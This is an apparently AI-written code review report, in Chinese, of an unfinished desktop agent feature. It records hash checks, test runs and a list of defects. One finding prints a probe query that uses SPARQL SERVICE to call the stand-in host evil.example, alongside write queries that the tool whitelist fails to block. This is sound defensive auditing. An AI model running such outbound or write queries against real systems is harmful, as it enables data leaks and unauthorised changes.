# T08 完整累计实现独立对抗审查报告（minimax / M3.1-Flash）

> 唯一报告路径：`/Users/kyle/Documents/工作/知爻/本体/.worktrees/T08-minimax-review-93516fa/docs/reviews/T08/review-runtime/reports/minimax-m31flash.md`
> 受理记录：`docs/reviews/T08/review-runtime/metadata/minimax-m31flash-acceptance-20261023.json`
> 运行元数据：`docs/reviews/T08/review-runtime/metadata/minimax-m31flash-review-metadata.json`

---

## 1. 结论（先行）

**总体结论：不通过（NotPass）。**

理由分两层，必须分开看：

**第一层 —— 完整原验收未满足，属客观缺前置，不是本轮可修项。** T08 当前交付物是**纯模块 + 一个未挂载的 React 组件**。本轮实际核验并确认：

- `apps/desktop/src/main/agent/*` 六个模块与 `apps/desktop/src/renderer/src/agent/*` 四个文件**没有任何生产调用点**（全仓 grep 只命中 `tests/unit/t08-*.test.ts`）；
- `apps/desktop/src/preload/index.ts` **没有**任何 agent 桥接方法；`main/index.ts`、`main/task-service.ts` **没有**任何 agent IPC 通道；
- `AgentSidebar` **未挂载**于 `App.tsx`；
- 构建产物中不含 agent 代码：`apps/desktop/out/main/index.js` 对 `AGENT_SYSTEM_PROMPT` / `deepseek-v4-pro` / `t08-agent` 命中 **0** 次；renderer CSS 产物对 `t08-agent` 命中 **0** 次；renderer JS 产物不含 `t08-receipt` / `t08-agent`；
- T08 对 base→product 的 44 项差异**全部是新增文件**，`packages/contracts`、`preload/index.ts`、`csp.ts`、`App.tsx`、`style.css` **零改动**。

因此 PRD FR-800–806、FR-900–902/904、FR-204/302/400、附录 F、11.3 九类、12.2 七项的关键验收（真实模型、真实领域工具、真实 Diff/真人确认/原子事务/撤销恢复、I06 最终字节授权与安全存储、最小外发记录、两 OS、真人、CI/远端）在**本线不可能有通过证据**。这与产品方自己的 `acceptance-evidence-map.json`（15 条全部 `not-passed`）一致，本轮不重复夸大。

**第二层 —— 已实现代码本身做了完整实质审查，发现 1 项 P1、7 项 P2、3 项 P3 新问题**，另有 8 项历史内审问题逐项确认在固定字节中**仍然关闭**。静态代码在 codec 严格性、会话/收据忠实性、错误净化、DOM 文本安全、字段投影最小化、可信上下文绑定这六个方面**未发现问题**（详见第 7 节）。

**本报告不把"局部静态通过"当作整体通过**，也不因为已知正式验收缺口而拒绝对代码本身给出实质结论。

---

## 2. 身份与固定对象核验（全部自行核验，非引用）

| 项 | 声明值 | 实测值 | 结论 |
|---|---|---|---|
| 官方附件字节数 | 59859 | 59859 | ✅ |
| 官方附件行数 | 373 | 373 | ✅ |
| 官方附件 SHA256 | `65104b0ce095ed1c163d16645cc408c8798bf3bb7fd8fc5132494c82f8eea65f` | 同左 | ✅ |
| 本方副本 vs 官方附件 | 逐字节一致 | SHA 与字节数**完全相同**，`diff` 无差异 | ✅ |
| 实际 cwd | `.worktrees/T08-minimax-review-93516fa` | 同左 | ✅ |
| Git 状态 | detached HEAD | `git rev-parse --abbrev-ref HEAD` → `HEAD`（detached） | ✅ |
| reviewHead | `5b64bfea538b638310cd3ce79e595c3b482e003d` | 同左 | ✅ |
| base | `5f910b52c69d86a1076b2032e5d3c63e715947f3` | `git cat-file -t` → commit | ✅ |
| product | `93516fa8455cf4b195cbfb699aa7a6652d428b6f` | commit，且 `merge-base --is-ancestor product HEAD` 为真 | ✅ |
| 受保护 AGENTS.md | `de15f6ce13795bb26fbf9807130f475fcac1e16be142bee62d70058056a5c8c4` | 同左，保持 ` M` 未暂存，**本轮未改** | ✅ |
| 旧 input-manifest | `33deedd2aaeb18852d513bef4d46ab047a27ded380d7fff9ef03e3eb9e9ba317` | 同左 | ✅ |
| dispatch-manifest | `2094ff9f2cb3ed2f6b28d43621e58f39da725d24113ffa83ecd797a7b714da60` | 同左 | ✅ |
| execution-addendum | `63ecae09efbc6b1ab86b8a8fe6e6ef50053d6769ddac1b9c5a0608933202ffe9` | 同左 | ✅ |
| 旧包声明的公共正文 SHA | `8f361f4d984511214111f85fa26c649e844ccda7896c4e5f1041f736f47d805d` | 与旧 manifest `sharedPromptBodySHA256` 一致 | ✅ |
| `source-git-bytes.json` | 941 tracked，`mismatchesOutsideProtectedPolicy` 空 | 一致（仅 `AGENTS.md` 为已声明的政策叠加） | ✅ |

**任务身份与设置读回**：sessionId `mvs_68301ad5197d46ed91bf9aee7ec39f19`（owner 官方 UI `Session > Copy > Copy session ID` 读回，且与本方 runtime session context **完全一致**）；model `M3.1-Flash`；effort `xhigh`；permission `始终授权` / bypassPermissions。**turnId 官方菜单未补记，保持 UNKNOWN**。本方未扫描 globalconfig、其他任务或 peer。

**清单核对（差异/缺件明确报出）**：

- `productDiff44`：manifest 44 项 == git diff 44 项，集合**完全一致**，全部为新增；
- `sourceScope25`：25 项全部落在 44 项差异内，无缺件；
- `completeProductTree`：manifest 828 项 == `git ls-tree -r 93516fa` 828 项，集合**完全一致**（首次比对出现差异是 git 对非 ASCII 路径加引号所致，`core.quotepath=false` 后归零，非真实缺件）；
- `packageFiles`：101 份快照**全部存在**且字节数/SHA256 与 manifest 相符；
- 85 项"快照 vs 活文件"比对中 3 项不同：`inputs/product/docs/reviews/T08/status.md`、`inputs/product/docs/reviews/T08/policy-receipt-2026-10-21.md`、`inputs/process/docs/reviews/T08/status.md`。**已逐项复核**：三份快照与 product 93516fa **逐字节相等**，活文件之所以不同，是这两份过程文档在 product 提交之后被合法续写。**无产品漂移**。

---

## 3. 本轮实际运行的证据（自行运行，非重跑历史日志）

全部命令 cwd 均为本审查树；已按要求 `env -u ROOT_SOURCE_PATH -u ONTOLEARN_TEST_ENGINE -u PYTHONPATH`，并显式令 `UV_PROJECT_ENVIRONMENT` / `VIRTUAL_ENV` 指向本树 `.venv`（editable `.pth` 与 `direct_url.json` 实测均指向本树 `packages/engine`），`TMPDIR` / `PYTEST_ADDOPTS` 指向本轮 run 目录。

| # | 命令 | exit | 结果 | raw（SHA256 / 字节） |
|---|---|---|---|---|
| 1 | `npm run check` | **0** | eslint `--max-warnings 0` 干净；prettier 干净；typecheck（contracts/unit/desktop）干净；**vitest 21 文件 / 717 项全过**；electron-vite build 成功；ruff check 干净；ruff format --check 179 文件；**pytest 1052 项全过** | `…-npm-check.txt` / `93d9733d…1f1` / 5286 |
| 2 | `vitest run` 定向 6 个 T08 文件 | **0** | **6 文件 / 87 项全过** | `…-vitest-t08.txt` / `10022861…f21` / 579 |
| 3 | `npm run verify:sources` | **0** | 已核对 12 个归档源文件 | 结果记录在 metadata |
| 4 | 审方探针（scratch，非产品测试） | **0** | **10/10 假设全部成立** | `…-reviewer-probe.txt` / `0232a119…d88` / 2695 |

**探针披露（诚实记录）**：探针首跑有 1 项**审方断言写错**——误断言 `mode='enabled'` 时 body 不含 `reasoning_effort`。实际产品行为是**正确的**（enabled 时必带 `reasoning_effort`），错的是我的断言。已修正断言并重跑，10/10 通过；首跑事实与修正均写在 raw 文件头，未改写成"首跑即通过"。

**边界**：以上是**本机静态 + 受控本地运行**证据。按 dispatch 原文，本轮**未**运行 `npm run dev`、`npm run test:e2e`（Electron 启动）、`engine:build`（PyInstaller）、`package:dir`、HMR 探针；**未**调用任何付费/真实模型 API；**未**读取任何 `.env`/密钥/钥匙串；**未**读取 peer 报告/队列、globalconfig，未 `git worktree list`，未扫描父 `.worktrees`。

---

## 4. 历史证据（读过的原件；明确不是本轮测试，也不是指定模型 Pass）

| 原件 | 核验方式 | 结论 |
|---|---|---|
| `evidence/check-93516fa-original.txt` | 全文读；rootdir 为**另一个** worktree `T08-agent-model` | 内容为 717 TS / 1052 Py 的历史成功日志。**本轮不宣称重跑该日志**；第 3 节是我自己在本树的独立运行，数值一致属交叉印证 |
| `evidence/verification-93516fa.json` | 25 项文件 SHA256 逐项与本树实际文件比对 | **25/25 全部一致**，候选字节未漂移 |
| `evidence/verification.json` / `-af9e59f` / `-3a4c2ea` | 读取并比对各自哈希清单 | 与 backlog 声明的 SHA 一致 |
| `evidence/check-first-failure.txt.gz` | 解压至本轮 scratch，比对 SHA | 原件 SHA `6f8e8f3d…`、归档 SHA `872d85a4…`，内容为**首跑缺 `.venv/bin/python` 导致 8 项 task-runtime ENOENT** 的真实失败，未被改记为通过 |
| `evidence/fixed-input-first-failure.txt.gz` | 解压比对 | 原件 SHA `ca906c07…` 与声明一致；失败原因为 `instruction.trim` 改写 SPARQL 末尾换行导致 harness 不匹配 |
| `evidence/sidebar-first-test-failure.txt.gz` | 解压比对 | 原件 SHA `a5823a76…` 与声明一致；失败原因为 SSR 断言误匹配转义文本/动作标签 |
| `evidence/t09-input-verification.json` | 逐项核对 | 17 项来源文件哈希齐全；保留的 3 份输入原字节与本树 fixtures 一致 |
| `evidence/fixed-input-actual-observations.json` | 读取 | 记录的是**真实 RDFLib 观测**；与本轮探针独立复现的 Q-01=A01 / 同数量语义错=A02 一致 |
| PRD 原字节 | 实测 | `docs/prd/…md` SHA = `7586b2c4784b8c691d510e2be16310ed551e110af6df96b7c6aeb86152f60fbb`，与 `origin-manifest.json` 声明**完全一致**，PRD 未被改动 |

---

## 5. 全文阅读覆盖清单

**规则与控制**：`AGENTS.md`（SHA `de15f6ce…`，本树实际全文）、`developer-common-instructions.md`、`desktop-operation-policy-20261022.md`、`external-review-permissions.md`（三者按 dispatch 逐字快照全文读完）。

**需求依据**：`docs/prd/PRD-本体学习与落地Agent工作台.md` 全文（1255 行），逐项核对 FR-800/801/802/803/804/805/806、FR-900/901/902/903/904、FR-204、FR-302、FR-400、§10.1–10.5、§11.3（九类）、§12.2（七项）、附录 C/D/E/F/G（含 G.5 A-01…A-10）。

**实现 10/10**：`agent-service.ts`(340) `capabilities.ts`(80) `conversation.ts`(222) `deepseek-codec.ts`(180) `errors.ts`(21) `tools.ts`(85) `AgentSidebar.tsx`(290) `agent-sidebar.css`(181) `context-actions.ts`(42) `sidebar-presentation.ts`(81)。

**测试 6/6**：`t08-agent`(361) `t08-codec`(201) `t08-conversation`(394) `t08-evaluation`(115) `t08-fixed-input`(268) `t08-sidebar`(196)。

**fixture 9/9**：`fixed-input-cases.v2.json` `fixed-input-probe.py` `manifest.v1.json` `manifest.v2.json` `synthetic-cases.v1.json`（13 案逐案结构核对）`t09-873c8c0/` 4 件。

**其余 19 项差异**：`design-and-integration.md`(113) 全文、`internal-review-1..8` 全文、`status.md`、`policy-receipt-2026-10-21.md`、`dual-review-backlog-2026-10-22.md`、全部 evidence JSON 与三份 gzip 原件。

**其余 828 项产品树**：按 manifest 与 `git ls-tree` 全量核对集合一致；并实测确认 agent 模块未进入任何构建产物、未接入 preload/IPC/App。

---

## 6. 历史内审 1–8 逐项关闭核对（固定字节 `93516fa`）

| 历史问题 | 原文结论 | 在固定代码中是否仍成立 | 证据 |
|---|---|---|---|
| IR1-P1 自由文本 suggestion 可声称"检查通过"、可只选成功引用隐藏失败 | 不通过 | **仍关闭** | `agent-service.ts:296-312`：只要 `this.receipts.size` 非零，suggestion/uncertain/evidence 三分支**一律**返回宿主完整收据；`resolveAnswer` 的 schema 无自由文本字段（`agent-service.ts:279-288`）。回归：`t08-agent.test.ts:299-327`（混合成功/失败后 suggestion、uncertain、只选成功引用均返回全部收据）、`t08-agent.test.ts:134-147`（异常原文不外传）、`t08-agent.test.ts:328-336`（无依据自由文本被拒） |
| IR1-P2 工具 ID 与答案引用 schema 不一致（`call.provider/1` 被项目 ID 正则拒绝） | 不通过 | **仍关闭** | `agent-service.ts:283` 复用 `toolCallSchema.shape.id`；`deepseek-codec.ts:9` `callId` 为 1–128 自由串，与 `tools.ts:25` 的实体 ID 正则**有意分离**。回归：`t08-agent.test.ts:300-318`、`t08-codec.test.ts:176-191`（标点 ID 往返；空/超长拒绝） |
| IR3 跨用户问题沿用上一问题成功收据 | 不通过 | **仍关闭** | `agent-service.ts:128-131` `beginUserTurn()` **只** `receipts.clear()`，`usedCalls`/`consumed` 不清零；`conversation.ts:207-216` `addUserTurn` 严格校验后调用。回归：`t08-conversation.test.ts:250-285`（新问题 uncertain、旧引用被拒 INVALID_EVIDENCE）、`t08-agent.test.ts:347-361` |
| IR4 最终模型失败/预算耗尽/批次取消后已生成草稿不可取 | 暂不通过 | **仍关闭** | `agent-service.ts:133-135` `currentTurnReceipts()` 只读克隆；`conversation.ts:93-103` `state()` 恒带 `localReceipts` 与原始 `inputContext`，与 `answer` 分离；`fail()`(`conversation.ts:86-91`) 不擦除收据。回归：`t08-conversation.test.ts:287-353`、`t08-conversation.test.ts:355-385`（三工具批次前项成功/中项取消/后项未执行）、`t08-agent.test.ts:387-393`（嵌套快照不可反写） |
| IR6-P2a 本地模式仍可触发模型重试 | 不通过 | **仍关闭** | `AgentSidebar.tsx:196` 重试按钮 `disabled={busy \|\| !isCurrent \|\| !modelAvailable}`，`modelAvailable = privacy !== 'local' && modelReady`(`:123`)。回归：`t08-sidebar.test.ts:176-182` |
| IR6-P2b `inputContext` 缺 selectedObjectIds/module/mode，侧栏与 main 判断不一致 | 不通过 | **仍关闭** | `agent-service.ts:14-24` 完整 TrustedContext；`sidebar-presentation.ts:42-56` 逐字段 + 有序选择集合比较。回归：`t08-sidebar.test.ts:183-195` |
| IR8 固定输入探针保真（真实 RDFLib、无 expected 预填、区分 Q-01/Q-02/同数量语义错） | 通过 | **仍成立且本轮独立复核通过** | PRD SHA 实测一致；`fixed-input-probe.py:63-70` 仅从真实 18 条断言建新图并按 case 改数据；`:87-96` 语法错误与执行错误分开；`:52-60` CSV 用标准库实读保留 `001`/`002` 与物理行 2/3。**本轮实测**（探针 + 定向 87 项）：Q-01→A01、Q-01-semantic-wrong→A02（行数相同、对象不同）、Q-02→空、Q-01-syntax-wrong→QUERY_SYNTAX |

**结论：8 份历史内审意见无一回退，全部保持关闭；本轮未发现任何历史问题被重新引入。**

---

## 7. 新发现问题

> 严重度定义：**P0** = 会导致错误结论被当作通过、数据损坏或权限绕过；**P1** = 违反已冻结的 P0 产品条款且当前无补偿控制；**P2** = 真实缺陷/契约缺口，有明确触发与影响，可修；**P3** = 诊断性、健壮性或一致性瑕疵。
> "缺前置"与"可修代码问题"在每条内**分别标注**。

### P1-1 白名单边界不实施 FR-803 / 附录 F 的"只读 + 禁外联"，`query_execute` 原样放行 SERVICE / 写操作

- **位置**：`apps/desktop/src/main/agent/tools.ts:20-24`（`sparql` schema 仅非空/长度/非全空白）、`tools.ts:32`（`query_execute: z.object({ sparql, scope }).strict()`）、`tools.ts:56`（描述称"不允许外联或更新"）
- **触发**（本轮实测成立）：
  `parseToolArguments('query_execute', JSON.stringify({ sparql: 'SELECT * WHERE { SERVICE <http://evil.example/sparql> { ?s ?p ?o } }', scope: 'asserted' }))` → **通过**；同形 `DELETE WHERE {…}` → **通过**；`INSERT DATA {…}` → **通过**。探针 P1 通过。
- **影响**：PRD **§10.4**「SPARQL 在 P0 同时受只读和禁止外联约束，`SERVICE` 等网络能力不得启用」与**附录 F** 最后一行「执行含 `SERVICE` 或远程 `FROM` 的查询 | **P0 不允许** | 不执行网络访问 | **阻止并解释**只读与外联是不同权限」。T08 是白名单的定义方，唯一的控制点被放在**尚未建造**的领域端口内；一旦端口按 `args.sparql` 直传执行器，外联与写更新将不受 T08 约束。附录 F 还要求"**阻止并解释**"——T08 **没有任何面向用户的阻止/解释路径**（`tools.ts:56` 的文案只发给模型看，不是用户提示）。
- **性质拆分**：**部分为已声明的边界分工**——`docs/iterations/T08/design-and-integration.md:57` 明写「SPARQL 只读与禁外联由真实 T04/I05 执行器保证，T08 不另造不完整词法检查器」，故不按"隐瞒缺陷"计；但"阻止并解释"的**用户可见行为**在本线**完全无实现**，且白名单层零补偿控制，仍构成 P1。
- **建议**：在工具契约层加入显式只读/禁外联拒绝（对含 `SERVICE`、远程 `FROM`、`BASE`、`INSERT`/`DELETE`/`CONSTRUCT` 的查询返回固定错误码并给出用户可读说明），或在 T00/T04 接线验收条目中把"阻止并解释"固化为可验收项，避免接线时静默丢失。

### P2-2 正式受测模型/配置身份未在响应路径强制固定，`assessCapabilities` 无生产调用点

- **位置**：`apps/desktop/src/main/agent/deepseek-codec.ts:124`（`model: z.string().min(1).max(256)`，无与 `REQUEST_MODEL` 的等值约束）、`deepseek-codec.ts:148-172`（`decodeChatResponse` 原样返回 `response.model`）、`conversation.ts:194-199`（把 `returnedModel`/`fingerprint` 原样回给宿主）、`apps/desktop/src/main/agent/capabilities.ts:39-80`
- **触发**（实测成立）：`decodeChatResponse` 接受 `model: 'some-other-model-v9'` 并原样返回（探针 P2 通过）。全仓 grep：`assessCapabilities` **只**被 `tests/unit/t08-evaluation.test.ts` 引用，**无任何生产调用点**。
- **影响**：FR-900 要求区分"能够连接/结构化输出/受控工具调用"，11.3 与 A-10 的受测版本固定依赖"受测返回标识 + 漂移即重评"。当前放行路径只做**记录**不做**比对**：模型或端点被替换时，T08 层不会失败，也不会阻断。
- **性质**：**可修代码问题 + 接线契约缺口**。设计已把漂移判定写成"消费宿主可验证收据"的库函数，但**未指定执行者与强制检查点**。
- **建议**：把 `assessCapabilities` 变成放行必经关口（`acceptResponse` 或 I06 网关侧强制以 baseline 签名比对 `returnedModel`/`fingerprint`/`mode`/`effort`/`codecVersion`），不匹配即 `drift-requires-evaluation` 阻断而非仅记录。

### P2-3 thinking 模式退化检测是**有条件**的，而条件在最需要它时不成立

- **位置**：`deepseek-codec.ts:63-69`（`mode === 'enabled' && availableTools.length && typeof message.reasoning_content !== 'string'`）、`conversation.ts:160-166`（同条件）
- **触发**（实测成立）：`availableTools: []` 且 `mode: 'enabled'` 时，缺 `reasoning_content` 的 assistant 消息**被正常编码**（探针 P3 通过）；会话层同样接受并进入 `answered`（探针 P3b 通过）。
- **影响**：`design-and-integration.md:12` 要求「不默默改为非思考模式」。当前只有"已装工具"路径能检出 reasoning 缺失；而"尚未安装任何领域端口"恰好是**接线前**的常态——这是最容易出现"请求带 `thinking:{type:'enabled'}` 但供应方静默不返回 reasoning"的阶段，而该阶段恰无检测。现有回归 `t08-codec.test.ts:72-87` 只覆盖"有工具"分支。
- **性质**：**可修代码问题**。
- **建议**：把必填性判据与 `availableTools.length` 解耦，改为按 `mode === 'enabled'` 判定（至少在存在会话选项时判定）。

### P2-4 实际 provider 用量从未与 token 上限比对；输入 token 随轮次线性累积而无独立闸门

- **位置**：`conversation.ts:110-115`（预算判据只比 `requestedTokenCeiling + maxTokens`）、`conversation.ts:123-124`（`requestedTokenCeiling += maxTokens`）、`conversation.ts:194-199`（`usage` 仅回传，从不参与判定）
- **触发**（实测成立）：`maxTokens = 1`、`maxTotalRequestedTokens = 524288`，供应方返回 `usage.total_tokens = 1,700,000` → `acceptResponse` **正常成功**，`state.error === null`，`requestedTokenCeiling` 仍为 1（探针 P7 通过）。
- **影响**：T08 侧唯一的本地闸门对**实际消耗**零约束；同时每轮**重发全量历史**（历史随工具轮次增长），输入 token 随轮次累积，而 `maxTotalRequestedTokens` 只约束"请求值"，唯一兜底是 body 512 KB 字节闸门（`deepseek-codec.ts:94`）。设计已声明"不是费用核算或输入 token 预算，I06 仍须控制实际总 token/费用硬上限"，故**主要是缺前置**；但"累计已请求输出 token 上限"这一自称的本地闸门对实际消耗完全不设防，属**可修代码问题**。
- **建议**：在 `acceptResponse` 累计 actual usage 并与 `maxTotalRequestedTokens` 比对（超限即 `BUDGET_EXCEEDED`），并按累计 usage 而非仅 `maxTokens` 收紧后续轮次上限。

### P2-5 失败原因码在发往供应方的投影中被丢弃

- **位置**：`apps/desktop/src/main/agent/agent-service.ts:316-328`（非 evidence 分支只输出 `{ kind }`）
- **触发**（实测成立）：`projectToolMessage({ callId:'c1', tool:'query_execute', outcome:{ kind:'failure', code:'TIMED_OUT' } }, [])` → 内容为 `'{"kind":"failure"}'`，**无错误码**（探针 P6 通过；仓库回归 `t08-agent.test.ts:146` 亦锁定该行为）。
- **影响**：主机本地仍持有完整码、UI 显示正确，但**模型侧**只看到"失败"，无法区分超时/取消/参数非法/上下文过期/依据无效，因而无法按 FR-806 与附录 F「工具失败必须返回失败」选择正确下一步（例如 `STALE_CONTEXT` 需重取上下文而非重试，`TIMED_OUT` 可重试）。多轮工具协议中这是可操作性差异。
- **性质**：**可修代码问题**（当前实现是"最小化"的有意取舍，但取舍过头，丢失了模型决策所需的**非敏感**分类信息）。
- **建议**：投影中保留**枚举化、无正文**的失败分类（timeout / cancelled / invalid_arguments / stale_context / invalid_evidence / unavailable / failed），不泄漏原始异常文本。

### P2-6 侧栏只有 SSR 证据，交互行为（防重入、输入保留、错误提示）**零自动化证据**

- **位置**：`apps/desktop/src/renderer/src/agent/AgentSidebar.tsx:114-138`（`useState`/`useRef`/`inFlight`/`invoke`）、`:232-248`（表单与发送条件）、`:189-203`（错误区）
- **触发**：本仓**无** jsdom、无 `@testing-library`（`node_modules` 实测两者皆无），`vitest.config.mts` 的 `include` 仅 `tests/unit/**`；`tests/unit/t08-sidebar.test.ts` 使用 `renderToStaticMarkup`（SSR）——事件不触发，`useState` 不更新。因此 `onSubmit`/`onRetry`/`onPreviewDraft`/`onAction` 回调、`inFlight` 重入保护、`question` 输入保留**全部未被任何测试执行**。
- **影响**：FR-806「模型不可用/超时/格式错误时，系统必须保留用户当前操作和本地数据，提供重试、查看错误或改用本地功能的入口」与 FR-801 的交互部分最终依赖这些行为；当前**只有静态输出**证明"按钮是 disabled 的"。产品方文档已诚实声明"SSR 只证明静态 React 输出，不证明挂载交互"，但该缺口目前**没有任何补偿性证据**。
- **性质**：**可修测试缺口**（不改实现也能补）。
- **建议**：在获批的前端测试环境（jsdom/testing-library 或 Electron e2e）补 4 类断言：连续点击不重复提交、失败后 `question` 仍在、缺 handler 时点击无副作用、local 档下 retry 保持 disabled。

### P2-7 local 档下页面动作全部 disabled，"切换为离线能力"无实体承载

- **位置**：`apps/desktop/src/renderer/src/agent/context-actions.ts:20-39`、`apps/desktop/src/renderer/src/agent/AgentSidebar.tsx:167-187`
- **触发**：`privacy='local'` 且 `localActions` 仅含 `'hint'` 时，未接线动作渲染为 disabled、文案"本地服务尚未接线"；仓库既有断言 `t08-sidebar.test.ts:128-137` 反而**固定**了"local 档所有按钮均 disabled"这一现状。
- **影响**：FR-801 要求"无模型时应**切换为 FR-101 的离线能力**，而不是显示无响应按钮"；附录 F/FR-101 要求离线连续性。T08 只提供"已有本地处理器才路由"的**策略**，自身不提供任何离线能力。当前 T09 真实离线处理器未接线（组件整体也未挂载），故现状无用户可见影响，但**该 FR 目前无法判定通过**。
- **性质**：**缺前置（接线项）**，非实现错误——实现侧策略本身是保守正确的。
- **建议**：在 T00/T09 接线验收中固定"local 档下至少 N 个可执行离线动作"，否则 FR-801/FR-101 无法收口。

### P2-8 隐私档位（完全本地 / 最小 / 项目）未进入主进程数据形状

- **位置**：`apps/desktop/src/main/agent/conversation.ts:15-25`（`optionsSchema` **无** privacy 字段）、`agent-service.ts:14-24`（`contextSchema` 的 `mode` 是导师/项目模式，**不是**隐私档位）、`deepseek-codec.ts:84-97`（编码 body 不含档位）、`AgentSidebar.tsx:19`（privacy 仅作为组件 prop）
- **触发**：构造 `AgentConversation`（options 无档位）→ `prepareExchange` 正常返回**可发送 body**，其中不含任何隐私档位信息。
- **影响**：FR-902「切换到完全本地后不得发起新的外部请求」与附录 F「切换完全本地 | 禁止新的第三方请求」的实际执行者被指定为 I06 网关；但**唯一持有会话状态与最终 body 的一方（T08）不提供档位信息**，网关无法从 body 或会话状态判断当前档位，只能依赖 T08 之外的旁路约定。`design-and-integration.md:20-24` 的 I06 输入清单（项目/操作身份、目的、配置不透明 ID 与版本、规范化 endpoint、凭据主体版本、授权决策引用、字段溯源、最终 body、AbortSignal、预算/费用硬上限）中**确实没有隐私档位**。
- **性质**：**接口形状缺口 + 缺前置**（最终阻断在 I06，但根因在 T08 提供的形状）。
- **建议**：把当前隐私档位纳入会话状态与 `prepareExchange` 的返回（作为纯数据随 body 同行），使 I06 可以在**同一份最终字节**上判定"完全本地禁止新发送"。

### P3-9 可信上下文同一性比较对 `selectedObjectIds` 顺序敏感

- **位置**：`apps/desktop/src/main/agent/agent-service.ts:78-80`（`sameContext` 用 `JSON.stringify` 全等）
- **触发**（实测成立）：宿主以不同顺序返回**同一集合** → `sameContext` 为 false（探针 P5 通过）→ 抛 `STALE_CONTEXT`。
- **影响**：假阳性阻断（非安全漏洞，方向 fail-closed）。另注：主进程比 UI 更敏感——`sidebar-presentation.ts:51-54` 用长度 + 逐位比较，与 main 语义不一致。
- **建议**：比较前对 `selectedObjectIds` 做稳定排序，或改为逐字段显式比较。

### P3-10 工具调用 ID 语义错误码与判因不符

- **位置**：`apps/desktop/src/main/agent/deepseek-codec.ts:72-74`（历史中重复的 call ID 抛 `TOOL_NOT_ALLOWED`）；`apps/desktop/src/main/agent/agent-service.ts:145`（并发重入抛 `BUDGET_EXCEEDED`）
- **触发**：同一历史中重复出现同一 tool call ID → `TOOL_NOT_ALLOWED`；会话并发重入 → `BUDGET_EXCEEDED`。
- **影响**：纯诊断偏差——`sidebar-presentation.ts:29` 把 `TOOL_NOT_ALLOWED` 显示为"该工具或范围不在白名单中"，会把"ID 重复"误报为"白名单问题"；把并发重入报成"已达请求上限"同理。
- **建议**：区分"ID 重复"（→ `INVALID_PROTOCOL`）与"工具不在白名单"；并发重入另给专属码。

### P3-11 私有工具词汇与公共能力注册表之间无自动化防分叉断言

- **位置**：`apps/desktop/src/main/agent/tools.ts:4-5`（注释自述"不是公共引擎能力注册表"）、`:5-16`（10 个私有工具名）
- **触发**：静态成立。
- **影响**：FR-803 要求工具受控；设计明确 `tools.ts` 由 T00 映射到唯一注册表。当前**没有任何测试**断言"私有词汇 == 公共注册表"，分叉风险仅靠流程约束而非机制。
- **建议**：在 T00 接线验收中加入一一映射的固定断言（两侧工具名集合相等、读写分类一致）。

---

## 8. 已检查并**排除**的疑似问题（记录以免重复劳动）

- **`requestInputSchema` 的 `messages` 上限 100 会不会被合法配置突破？** — 不会。`AgentConversation` 构造 `AgentSession` 时**未传** `maxCalls`，恒为默认 12（`agent-service.ts:118`），故总工具调用 ≤ 12；`maxExchanges` ≤ 16；每工具轮最多追加 1 条 assistant + N 条 tool 消息。据此推算消息数上界 ≈ 2 + 12×3 + 16 ≈ 54，**远小于 100**，且 512 KB 字节闸门更早生效。**未构成可达缺陷。**
- **供应方跨请求重新编号 tool call ID 会否导致第二轮失败？** — 会：`agent-service.ts:184` 的 `usedCalls` 拒绝会话内重复 ID（`deepseek-codec.ts:72-74` 亦拒绝历史内重复），若供应方每请求从 `call_0` 重新计数，第二个工具轮会以 `INVALID_PROTOCOL` 终止会话。**但这是设计明确要求的"同 session 调用 ID 不重用"**（`design-and-integration.md:55,81`），且真实供应方是否全局编号**本线无法验证**（无真实 API 权限）。故**记为未验风险，不计为缺陷**，并在 11.3/A-10 真实评估时必须覆盖。
- **`z.toJSONSchema` / `z.iso.datetime()` 是否为有效 API？** — 有效。`zod` 锁定 `4.6.7`（`packages/contracts/package.json:11`，`node_modules/zod/package.json` 实测同版本），两 API 均属 Zod 4。
- **renderer 引入 main 目录类型是否违反渲染端隔离？** — 不违反。两处均为 `import type`（`AgentSidebar.tsx:2`、`sidebar-presentation.ts:1-2`），编译期擦除，不引入 Node/网关运行时依赖。
- **CSS 是否可注入外部资源？** — 不可。`agent-sidebar.css` 全文 181 行无 `url()`、无 `@import`、无外部字体；且该 CSS 因组件未挂载**根本未进入** renderer 产物。
- **DOM 是否可注入 HTML/脚本？** — 不可。全部业务/模型字符串均走 React 文本节点，无 `dangerouslySetInnerHTML`（全仓 grep 无命中）。既有回归 `t08-sidebar.test.ts:116-127` 以转义断言锁定，本轮读码复核一致。

---

## 9. 完整原验收逐条结论

| 要求 | 本轮结论 | 依据 |
|---|---|---|
| FR-800 上下文感知 / 不可信数据不提升权限 | **NotPass（缺前置）** | 代码侧严格上下文 + 注入拒绝有静态与单测证据；真实项目/导入数据路径未接线 |
| FR-801 页面动作 / 无模型转离线 | **NotPass（缺前置）** | 策略层成立；离线能力实体与页面挂载均未接线；见 P2-7 |
| FR-802 导师/项目两模式 | **NotPass（缺前置）** | `mode` 贯通上下文/系统提示/辅助级别；真实模型两模式质量与学习记录未验 |
| FR-803 工具白名单 / 读写分类 / 工具结果不自动外发 | **NotPass** | 读写分类与"投影≠授权"成立；**但只读+禁外联在白名单层缺失（P1-1）**；公共注册映射未接线 |
| FR-804 / A-01 / A-02 版本化 Diff·原子提交·撤销 | **NotPass（缺前置）** | T08 只产出带基准的草稿并要求真人确认；T01 真实 Diff/事务/撤销未联验 |
| FR-805 / A-09 可信回答边界 | **部分成立，整体 NotPass** | 宿主收据不可被模型删减/替换，失败·过期·历史·取消如实展示（静态+单测）；真实领域依据未接线 |
| FR-806 模型失败降级 | **NotPass（缺前置）** | 会话层保留输入与已完成记录、重试入口存在；**但交互行为零自动化证据（P2-6）**、离线连续性未接线 |
| FR-900 / Q9 能力验证与正式受测模式 | **NotPass** | 连接/结构化/工具三类能力已分离且合成永不 ready（`t08-evaluation.test.ts:62-89`）；**真实 DeepSeek、正式模式固定与响应路径强制比对均未验（P2-2）** |
| FR-901 密钥保护 | **NotPass（缺前置）** | T08 不持有任何凭据且不导入 HTTP；I06 安全存储与两 OS 保护未验 |
| FR-902 / A-03 / A-04 / A-05 最终外发检查与隐私档 | **NotPass** | 字段投影确为最小化且非授权（`agent-service.ts:315` 明示）；**档位未进入主进程形状（P2-8）**；I06 逐字节溯源授权、端点/主体失效、在途切本地均未验 |
| FR-904 最小外发调用记录 | **NotPass（缺前置）** | 本线无任何实现，未伪造 |
| FR-204 / FR-302 / FR-400 / 11.3 | **NotPass（缺前置）** | v1 合成 13 案 + v2 真实 RDFLib/CSV 观测成立且忠实；真实模型建议/映射/NL 生成与获批领域执行未验 |
